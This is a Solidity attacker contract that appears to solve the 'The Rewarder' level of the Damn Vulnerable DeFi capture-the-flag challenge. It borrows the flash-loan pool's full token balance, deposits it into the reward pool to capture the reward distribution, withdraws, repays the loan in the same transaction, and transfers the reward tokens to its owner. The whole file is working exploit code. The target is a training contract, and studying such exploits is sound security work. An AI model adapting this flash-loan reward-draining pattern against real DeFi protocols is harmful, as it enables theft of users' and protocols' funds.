// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "../DamnValuableToken.sol";
import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/RewardToken.sol";
import "../the-rewarder/TheRewarderPool.sol";

contract TheRewarderAttacker {
    address private immutable flashLoanPool;
    address private immutable rewardPool;
    address private immutable owner;

    constructor(address flashLoanPool_, address rewardPool_) {
        flashLoanPool = flashLoanPool_;
        rewardPool = rewardPool_;
        owner = msg.sender;
    }

    function receiveFlashLoan(uint256 amount) external {
        DamnValuableToken liquidityToken = FlashLoanerPool(flashLoanPool)
            .liquidityToken();

        // deposit to reward pool
        liquidityToken.approve(rewardPool, amount);
        rewardPool.call(abi.encodeWithSignature("deposit(uint256)", amount));

        // withdraw from reward pool
        rewardPool.call(abi.encodeWithSignature("withdraw(uint256)", amount));

        liquidityToken.transfer(flashLoanPool, amount);
    }

    function exploit() external {
        DamnValuableToken liquidityToken = FlashLoanerPool(flashLoanPool)
            .liquidityToken();
        uint256 loanAmount = liquidityToken.balanceOf(flashLoanPool);
        flashLoanPool.call(
            abi.encodeWithSignature("flashLoan(uint256)", loanAmount)
        );
        RewardToken rewardToken = TheRewarderPool(rewardPool).rewardToken();
        uint256 balance = rewardToken.balanceOf(address(this));
        rewardToken.transfer(owner, balance);
    }
}
